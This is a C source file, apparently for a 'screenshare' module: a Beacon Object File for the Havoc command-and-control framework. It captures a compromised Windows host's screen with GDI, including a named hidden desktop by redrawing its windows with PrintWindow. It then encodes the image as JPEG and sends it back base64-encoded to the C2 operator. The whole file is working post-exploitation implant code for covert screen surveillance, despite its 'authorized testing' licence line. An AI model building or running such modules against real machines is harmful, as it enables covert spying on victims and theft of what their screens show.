/*
 * screenshot.c - Screen Capture BOF for Havoc C2
 *
 * Author:  Dhanush Gowda
 * Project: havoc-screenshare
 * License: For authorized security testing and educational use only.
 *
 * Captures the primary screen using GDI, encodes to JPEG via GDI+,
 * and returns the JPEG data as base64 through BeaconPrintf.
 *
 * Ported from gowdaC2's capture_screen_jpeg() implementation.
 *
 * Compile (cross-compile from Linux/WSL):
 *   x86_64-w64-mingw32-gcc -c -o screenshot.x64.o screenshot.c
 *   i686-w64-mingw32-gcc   -c -o screenshot.x86.o screenshot.c
 *
 * Usage in Havoc:
 *   Loaded via screenshare.py plugin
 *   BOF arg: int32 quality (1-100, default 40)
 *
 * Limitations:
 *   - Captures primary monitor only. Multi-monitor support would require
 *     parameterizing the monitor index and using EnumDisplayMonitors.
 *   - Output is base64-encoded, which adds ~33% overhead. At JPEG quality
 *     40, a 1080p frame is typically 50-150 KB (67-200 KB base64). A 4K
 *     frame at quality 40 is ~200-400 KB. The 4 MB cap on JPEG size
 *     keeps the BeaconPrintf buffer safe for all practical resolutions.
 */

#include <windows.h>
#include "beacon.h"

/* DFR - Dynamic Function Resolution */
DECLSPEC_IMPORT HDC     WINAPI USER32$GetDC(HWND);
DECLSPEC_IMPORT int     WINAPI USER32$ReleaseDC(HWND, HDC);
DECLSPEC_IMPORT int     WINAPI USER32$GetSystemMetrics(int);
DECLSPEC_IMPORT BOOL    WINAPI USER32$PrintWindow(HWND, HDC, UINT);
DECLSPEC_IMPORT BOOL    WINAPI USER32$GetWindowRect(HWND, LPRECT);
DECLSPEC_IMPORT BOOL    WINAPI USER32$IsWindowVisible(HWND);
DECLSPEC_IMPORT BOOL    WINAPI USER32$EnumDesktopWindows(HDESK, WNDENUMPROC, LPARAM);

DECLSPEC_IMPORT HDC     WINAPI GDI32$CreateCompatibleDC(HDC);
DECLSPEC_IMPORT HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC, int, int);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$SelectObject(HDC, HGDIOBJ);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$BitBlt(HDC, int, int, int, int, HDC, int, int, DWORD);
DECLSPEC_IMPORT int     WINAPI GDI32$GetDIBits(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteObject(HGDIOBJ);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteDC(HDC);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$PatBlt(HDC, int, int, int, int, DWORD);

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT SIZE_T  WINAPI KERNEL32$GlobalSize(HGLOBAL);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$GlobalUnlock(HGLOBAL);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CreateStreamOnHGlobal(HGLOBAL, BOOL, LPSTREAM*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$GetHGlobalFromStream(IStream*, HGLOBAL*);

DECLSPEC_IMPORT HDESK   WINAPI USER32$OpenDesktopW(LPCWSTR, DWORD, BOOL, ACCESS_MASK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$CloseDesktop(HDESK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetThreadDesktop(HDESK);
DECLSPEC_IMPORT HDESK   WINAPI USER32$GetThreadDesktop(DWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentThreadId(void);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);


/* GDI+ function typedefs */
typedef int (__stdcall *GdipStartupF)(ULONG_PTR*, void*, void*);
typedef int (__stdcall *GdipCreateBitmapFromScan0F)(int, int, int, int, unsigned char*, void**);
typedef int (__stdcall *GdipSaveImageToStreamF)(void*, void*, void*, void*);
typedef int (__stdcall *GdipDisposeImageF)(void*);
typedef int (__stdcall *GdipShutdownF)(ULONG_PTR);
typedef int (__stdcall *GdipGetImageEncodersF)(unsigned int, unsigned int, void*);
typedef int (__stdcall *GdipGetImageEncodersSizeF)(unsigned int*, unsigned int*);


/* ImageCodecInfo structure (matches GDI+ layout) */
typedef struct {
    GUID    Clsid;
    GUID    FormatID;
    wchar_t *CodecName;
    wchar_t *DllName;
    wchar_t *FormatDescription;
    wchar_t *FilenameExtension;
    wchar_t *MimeType;
    DWORD   Flags;
    DWORD   Version;
    DWORD   SigCount;
    DWORD   SigSize;
    BYTE    *SigPattern;
    BYTE    *SigMask;
} ImageCodecInfo;


static void b64_encode(const unsigned char *in, size_t len, char *out) {
    const char *t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i, j = 0;
    for (i = 0; i + 2 < len; i += 3) {
        out[j++] = t[(in[i] >> 2) & 0x3F];
        out[j++] = t[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
        out[j++] = t[((in[i+1] & 0xF) << 2) | ((in[i+2] >> 6) & 0x3)];
        out[j++] = t[in[i+2] & 0x3F];
    }
    if (i < len) {
        out[j++] = t[(in[i] >> 2) & 0x3F];
        if (i + 1 < len) {
            out[j++] = t[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
            out[j++] = t[((in[i+1] & 0xF) << 2)];
        } else {
            out[j++] = t[((in[i] & 0x3) << 4)];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    out[j] = '\0';
}


static int wcmp(const wchar_t *a, const wchar_t *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return *a - *b;
}


static wchar_t *to_wide(const char *s) {
    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (len <= 0) return NULL;
    wchar_t *w = (wchar_t *)KERNEL32$VirtualAlloc(NULL, len * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!w) return NULL;
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
    return w;
}


#define PW_RENDERFULLCONTENT 0x00000002

#define MAX_ENUM_WINDOWS 256
static HWND _pw_hwnds[MAX_ENUM_WINDOWS];
static int  _pw_count = 0;

static BOOL CALLBACK pw_enum_cb(HWND hwnd, LPARAM lParam) {
    if (USER32$IsWindowVisible(hwnd) && _pw_count < MAX_ENUM_WINDOWS) {
        RECT r;
        USER32$GetWindowRect(hwnd, &r);
        if ((r.right - r.left) > 0 && (r.bottom - r.top) > 0)
            _pw_hwnds[_pw_count++] = hwnd;
    }
    return TRUE;
}

typedef void* DPI_CTX;
typedef DPI_CTX (WINAPI *PFN_SetThreadDpiCtx)(DPI_CTX);

void go(char *args, int alen) {
    datap parser;
    int quality = 40;

    char *desktop_name = NULL;
    int name_len = 0;

    if (alen >= 4) {
        BeaconDataParse(&parser, args, alen);
        quality = BeaconDataInt(&parser);
        if (quality < 1) quality = 1;
        if (quality > 100) quality = 100;

        if (BeaconDataLength(&parser) > 0)
            desktop_name = BeaconDataExtract(&parser, &name_len);
    }

    /* Switch to hidden desktop if requested */
    HDESK hOrigDesk = NULL;
    HDESK hHiddenDesk = NULL;
    if (desktop_name && desktop_name[0]) {
        wchar_t *wName = to_wide(desktop_name);
        if (wName) {
            hHiddenDesk = USER32$OpenDesktopW(wName, 0, FALSE,
                DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW |
                GENERIC_READ);
            KERNEL32$VirtualFree(wName, 0, MEM_RELEASE);
            if (hHiddenDesk) {
                hOrigDesk = USER32$GetThreadDesktop(
                    KERNEL32$GetCurrentThreadId());
                USER32$SetThreadDesktop(hHiddenDesk);
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "[!] OpenDesktopW('%s') failed (err=%lu) - capturing default",
                    desktop_name, KERNEL32$GetLastError());
            }
        }
    }

    /* Set thread to per-monitor DPI aware so we capture the full physical screen */
    PFN_SetThreadDpiCtx pSetDpi = NULL;
    DPI_CTX oldDpi = NULL;
    HMODULE hU32 = KERNEL32$GetModuleHandleA("user32.dll");
    if (hU32) {
        pSetDpi = (PFN_SetThreadDpiCtx)KERNEL32$GetProcAddress(hU32, "SetThreadDpiAwarenessContext");
        if (pSetDpi)
            oldDpi = pSetDpi((DPI_CTX)(LONG_PTR)(-4));
    }

    #define DESK_RESTORE() do { \
        if (hOrigDesk) USER32$SetThreadDesktop(hOrigDesk); \
        if (hHiddenDesk) USER32$CloseDesktop(hHiddenDesk); \
    } while(0)
    #define DPI_RESTORE() do { if (pSetDpi && oldDpi) pSetDpi(oldDpi); } while(0)
    #define CLEANUP_RETURN() do { DESK_RESTORE(); DPI_RESTORE(); return; } while(0)

    /* Step 1: Screen capture */
    HDC hScreen = USER32$GetDC(NULL);
    if (!hScreen) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetDC failed");
        CLEANUP_RETURN();
    }

    int w = USER32$GetSystemMetrics(SM_CXSCREEN);
    int h = USER32$GetSystemMetrics(SM_CYSCREEN);

    HDC hMemDC = GDI32$CreateCompatibleDC(hScreen);
    if (!hMemDC) {
        USER32$ReleaseDC(NULL, hScreen);
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateCompatibleDC failed");
        CLEANUP_RETURN();
    }

    HBITMAP hBmp = GDI32$CreateCompatibleBitmap(hScreen, w, h);
    if (!hBmp) {
        GDI32$DeleteDC(hMemDC);
        USER32$ReleaseDC(NULL, hScreen);
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateCompatibleBitmap failed");
        CLEANUP_RETURN();
    }

    GDI32$SelectObject(hMemDC, hBmp);

    if (hHiddenDesk) {
        /* PrintWindow compositing: BitBlt returns black on non-input desktops,
           so we enumerate each visible window and use PrintWindow to force-render */
        GDI32$PatBlt(hMemDC, 0, 0, w, h, BLACKNESS);

        _pw_count = 0;
        USER32$EnumDesktopWindows(hHiddenDesk, pw_enum_cb, 0);

        int i;
        for (i = _pw_count - 1; i >= 0; i--) {
            RECT r;
            USER32$GetWindowRect(_pw_hwnds[i], &r);
            int ww = r.right - r.left;
            int wh = r.bottom - r.top;

            HDC hWndDC = GDI32$CreateCompatibleDC(hScreen);
            HBITMAP hWndBmp = GDI32$CreateCompatibleBitmap(hScreen, ww, wh);
            GDI32$SelectObject(hWndDC, hWndBmp);

            if (USER32$PrintWindow(_pw_hwnds[i], hWndDC, PW_RENDERFULLCONTENT))
                GDI32$BitBlt(hMemDC, r.left, r.top, ww, wh, hWndDC, 0, 0, SRCCOPY);

            GDI32$DeleteObject(hWndBmp);
            GDI32$DeleteDC(hWndDC);
        }
    } else {
        GDI32$BitBlt(hMemDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    }

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    int stride = ((w * 3 + 3) & ~3);
    int imgSize = stride * h;

    unsigned char *pixels = (unsigned char *)KERNEL32$VirtualAlloc(
        NULL, imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pixels) {
        GDI32$DeleteObject(hBmp);
        GDI32$DeleteDC(hMemDC);
        USER32$ReleaseDC(NULL, hScreen);
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed for pixel buffer");
        CLEANUP_RETURN();
    }

    GDI32$GetDIBits(hMemDC, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
    GDI32$DeleteObject(hBmp);
    GDI32$DeleteDC(hMemDC);
    USER32$ReleaseDC(NULL, hScreen);

    /* Step 2: Load GDI+ and encode to JPEG */
    HMODULE hGdiPlus = KERNEL32$LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus) {
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load gdiplus.dll");
        CLEANUP_RETURN();
    }

    GdipStartupF              pStartup     = (GdipStartupF)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusStartup");
    GdipCreateBitmapFromScan0F pCreateBmp   = (GdipCreateBitmapFromScan0F)KERNEL32$GetProcAddress(hGdiPlus, "GdipCreateBitmapFromScan0");
    GdipSaveImageToStreamF    pSaveToStream = (GdipSaveImageToStreamF)KERNEL32$GetProcAddress(hGdiPlus, "GdipSaveImageToStream");
    GdipDisposeImageF         pDisposeImage = (GdipDisposeImageF)KERNEL32$GetProcAddress(hGdiPlus, "GdipDisposeImage");
    GdipShutdownF             pShutdown     = (GdipShutdownF)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusShutdown");
    GdipGetImageEncodersSizeF pGetEncSize   = (GdipGetImageEncodersSizeF)KERNEL32$GetProcAddress(hGdiPlus, "GdipGetImageEncodersSize");
    GdipGetImageEncodersF     pGetEnc       = (GdipGetImageEncodersF)KERNEL32$GetProcAddress(hGdiPlus, "GdipGetImageEncoders");

    if (!pStartup || !pCreateBmp || !pSaveToStream || !pDisposeImage || !pGetEncSize || !pGetEnc) {
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] GDI+ function resolution failed");
        CLEANUP_RETURN();
    }

    struct { UINT32 ver; void *dbgCb; BOOL noExterns; BOOL noThread; } gdipInput = {1, NULL, 0, 0};
    ULONG_PTR gdipToken = 0;
    if (pStartup(&gdipToken, &gdipInput, NULL) != 0) {
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] GdiplusStartup failed");
        CLEANUP_RETURN();
    }

    /* PixelFormat24bppRGB = 0x21808 */
    void *pImage = NULL;
    pCreateBmp(w, h, stride, 0x21808, pixels, &pImage);
    if (!pImage) {
        pShutdown(gdipToken);
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] GdipCreateBitmapFromScan0 failed");
        CLEANUP_RETURN();
    }

    /* Find JPEG encoder */
    unsigned int numEncoders = 0, encSize = 0;
    pGetEncSize(&numEncoders, &encSize);

    ImageCodecInfo *encoders = (ImageCodecInfo *)KERNEL32$VirtualAlloc(
        NULL, encSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!encoders) {
        pDisposeImage(pImage);
        pShutdown(gdipToken);
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc for encoders failed");
        CLEANUP_RETURN();
    }

    pGetEnc(numEncoders, encSize, encoders);

    GUID jpegClsid = {0};
    BOOL foundJpeg = FALSE;
    unsigned int ei;
    for (ei = 0; ei < numEncoders; ei++) {
        if (encoders[ei].MimeType && wcmp(encoders[ei].MimeType, L"image/jpeg") == 0) {
            jpegClsid = encoders[ei].Clsid;
            foundJpeg = TRUE;
            break;
        }
    }
    KERNEL32$VirtualFree(encoders, 0, MEM_RELEASE);

    if (!foundJpeg) {
        pDisposeImage(pImage);
        pShutdown(gdipToken);
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] JPEG encoder not found");
        CLEANUP_RETURN();
    }

    /* Save to IStream */
    IStream *pStream = NULL;
    OLE32$CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    if (!pStream) {
        pDisposeImage(pImage);
        pShutdown(gdipToken);
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateStreamOnHGlobal failed");
        CLEANUP_RETURN();
    }

    /* EncoderQuality GUID */
    ULONG qualityVal = (ULONG)quality;
    GUID encQuality = {0x1d5be4b5, 0xfa4a, 0x452d, {0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb}};
    struct {
        UINT Count;
        struct { GUID Guid; ULONG NumberOfValues; ULONG Type; void *Value; } Parameter[1];
    } encParams;
    encParams.Count = 1;
    encParams.Parameter[0].Guid = encQuality;
    encParams.Parameter[0].NumberOfValues = 1;
    encParams.Parameter[0].Type = 4;  /* EncoderParameterValueTypeLong */
    encParams.Parameter[0].Value = &qualityVal;

    int sr = pSaveToStream(pImage, pStream, &jpegClsid, &encParams);

    pDisposeImage(pImage);
    pShutdown(gdipToken);
    KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);

    if (sr != 0) {
        pStream->lpVtbl->Release(pStream);
        BeaconPrintf(CALLBACK_ERROR, "[!] JPEG encode failed (status %d)", sr);
        CLEANUP_RETURN();
    }

    /* Extract JPEG bytes from stream */
    HGLOBAL hMem = NULL;
    OLE32$GetHGlobalFromStream(pStream, &hMem);
    SIZE_T jpegSize = KERNEL32$GlobalSize(hMem);
    void *jpegData = KERNEL32$GlobalLock(hMem);

    if (!jpegData || jpegSize == 0 || jpegSize > 4 * 1024 * 1024) {
        if (jpegData) KERNEL32$GlobalUnlock(hMem);
        pStream->lpVtbl->Release(pStream);
        BeaconPrintf(CALLBACK_ERROR, "[!] JPEG data invalid (size=%llu)", (unsigned long long)jpegSize);
        CLEANUP_RETURN();
    }

    /* Base64 encode and output */
    size_t b64len = ((jpegSize + 2) / 3) * 4 + 1;
    char *b64buf = (char *)KERNEL32$VirtualAlloc(NULL, b64len + 256,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!b64buf) {
        KERNEL32$GlobalUnlock(hMem);
        pStream->lpVtbl->Release(pStream);
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc for base64 failed");
        CLEANUP_RETURN();
    }

    b64_encode((const unsigned char *)jpegData, (size_t)jpegSize, b64buf);
    KERNEL32$GlobalUnlock(hMem);
    pStream->lpVtbl->Release(pStream);

    BeaconPrintf(CALLBACK_OUTPUT, "SCREENCAP:%dx%d:%llu\n%s",
        w, h, (unsigned long long)jpegSize, b64buf);

    KERNEL32$VirtualFree(b64buf, 0, MEM_RELEASE);

    if (hOrigDesk)
        USER32$SetThreadDesktop(hOrigDesk);
    if (hHiddenDesk)
        USER32$CloseDesktop(hHiddenDesk);

    if (pSetDpi && oldDpi)
        pSetDpi(oldDpi);
}
